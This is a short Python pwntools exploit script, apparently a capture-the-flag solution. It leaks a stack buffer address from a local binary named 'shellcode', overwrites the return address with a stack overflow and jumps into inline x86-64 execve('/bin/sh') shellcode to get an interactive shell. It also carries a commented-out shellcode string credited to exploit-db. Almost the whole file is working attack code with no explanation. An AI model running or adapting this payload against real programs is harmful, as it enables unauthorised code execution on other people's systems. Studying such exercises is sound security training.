from pwn import *
from LibcSearcher import *
code = ELF('./shellcode')
if args['REMOTE']:
    sh = remote(111, 111)
else:
    sh = process('./shellcode')

# 23 bytes
# https://www.exploit-db.com/exploits/36858/
#shellcode_x64 = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

context.arch = 'amd64'  
context.os = 'linux' 
shellcode = asm(
    '''
    mov rbx,0x68732f6e69622f;
    push rbx;
    mov rdi,rsp;
    xor rsi,rsi;
    xor rdx,rdx;
    mov rax,0x3b;
    syscall
    '''
)

sh.recvuntil('[')
buf_addr = sh.recvuntil(']', drop=True) 
buf_addr = int(buf_addr, 16) 
payload = b'b' * 24 + p64(buf_addr + 32) + shellcode 
print(payload)
gdb.attach(sh)
sh.sendline(payload)
sh.interactive()
